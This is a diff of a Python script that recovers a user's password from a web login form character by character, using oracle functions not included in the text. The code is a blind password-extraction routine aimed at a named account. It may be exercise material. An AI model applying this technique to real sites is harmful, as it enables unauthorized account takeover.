@@ -1,31 +1,128 @@
-lower = "abcdefghijklmnopqrstuvwxyz"
-upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-numbers = "0123456789"
 
-# https://stackoverflow.com/questions/54621596/include-both-single-quote-and-double-quote-in-python-string-variable
-# https://stackoverflow.com/questions/54620287/how-to-include-both-single-and-double-quotes-in-the-same-string-variable-in-pyth
-special = {|}~[\]^_`!"#$%&'()*+,-./:;<=>?@)
-# so use .join or """ i guess?
+def makeList(username, url, caseSensitive = False):
+   """checks for common characters in the password and returns the characters contained somewhere in the password string
 
-''.join("{|}~[\]^_`!#$%&'()*+,-./:;<=>?@)") + '"'
+   characters: a-z 0-9 "{|}~[\]^_`!#$%&'()*+,-./:;<=>?@)
+      if caseSensitive = True: A-Z
 
-for ch in lower:
-   # check for ch in 
-   if(checkPasswordCharacter(ch, username, url)):
-      # add it to the list
+   Args:
+      username: string
+         valid username to check password
+      url: string
+         url to form to check
+      caseSensitive: boolean (optional)
+         Set to true to check uppercase and lowercase versions of the characters
 
-for ch in numbers:
-   if(checkPasswordCharacter(ch, username, url)):
-      # add it to the list
+   Returns:
+      charList:
+         list of the characters in the password. 
+   """
 
-for ch in special:
-   # check for ch in 
-   if(checkPasswordCharacter(ch, username, url)):
-      # add it to the list
 
-for ch in upper:
-   # check for ch in 
-   if(checkPasswordCharacter(ch, username, url)):
-      # add it to the list
+
+   charList = []
+   lower = "abcdefghijklmnopqrstuvwxyz"
+   upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+   numbers = "0123456789"
+
+   # https://stackoverflow.com/questions/54621596/include-both-single-quote-and-double-quote-in-python-string-variable
+   # https://stackoverflow.com/questions/54620287/how-to-include-both-single-and-double-quotes-in-the-same-string-variable-in-pyth
+   # special = {|}~[\]^_`!"#$%&'()*+,-./:;<=>?@)
+   # so use .join or """ i guess?
+
+   special = ''.join("{|}~[\]^_`!#$%&'()*+,-./:;<=>?@)") + '"'
+
+   for ch in lower:
+      # check for ch in 
+      if(checkPasswordCharacter(ch, username, url)):
+         charList.append(ch)
+
+   for ch in numbers:
+      if(checkPasswordCharacter(ch, username, url)):
+         charList.append(ch)
+
+   for ch in special:
+      if(checkPasswordCharacter(ch, username, url)):
+         charList.append(ch)
+
+   for ch in upper:
+      if(checkPasswordCharacter(ch, username, url)):
+         charList.append(ch)
+
+   return charList
+
+
+def checkPass(username, url, charList, n):
+   """checks for a character in position i, and records it when the character at postion i was found.
+      
+      Args:
+         username:
+
+         url:
+
+         charList: list of valid characters from the password
+
+         n: integer
+            max size of passwords to check. will stop checking and return current progress if n < len(password)
+
+      Returns:
+         i: integer
+            returns i iff there is no character in charList that works at position i. also raises type and value error after printing i
+         password: string
+            correct password or, if len(password) = n, first n characters of password    
+
+      Raises:
+         TypeError: exception
+            raised with ValueErrors when findChar returns i instead of an element of CharList
+         ValueError: exception 
+            raised when no character in charList is correct.
+
+   https://stackoverflow.com/questions/2052390/manually-raising-throwing-an-exception-in-python
+   """
+   # dikt = {}
+   password = ""
+
+   for i in range(0, n):
+
+      # https://stackoverflow.com/questions/189645/how-to-break-out-of-multiple-loops-in-python
+
+      ch = findChar(username, url, charList, i)
+
+      # if(isinstance(ch, int))#if ch is int i, can't find a matching character at index i in password string 
+      # use try except instead of if(isinstance(ch, int)):
+      # https://stackoverflow.com/questions/3501382/checking-whether-a-variable-is-an-integer-or-not
+      
+      try: 
+         password += ch
+      except TypeError:
+         print(i)
+         raise ValueError("index i has no matching character")
+
+      if(testPassword(password, username, url)):
+         return password #password is found!
+
+   return password #only reached if password is too long for the given n
+
+
+
+def findChar(username, url, charList, i):
+   """helper function for checkPass
+   returns the first element of charList found that works for the password at index i
+   """
+
+   for ch in charList:
+         if(checkPasswordCharacter(ch, username, url, index = i)):
+            return ch
+
+   #only runs if no ch in charList match:
+   return i
+
+"""
+   Strategy:
+   
+   if findChar returns i -  meaning checkPass will print i then raise a type and a value error -
+   then perhaps check all unicode characters for the password at index i and add the one that works to the charaters checked and rerun the script
+   
+"""
 
 
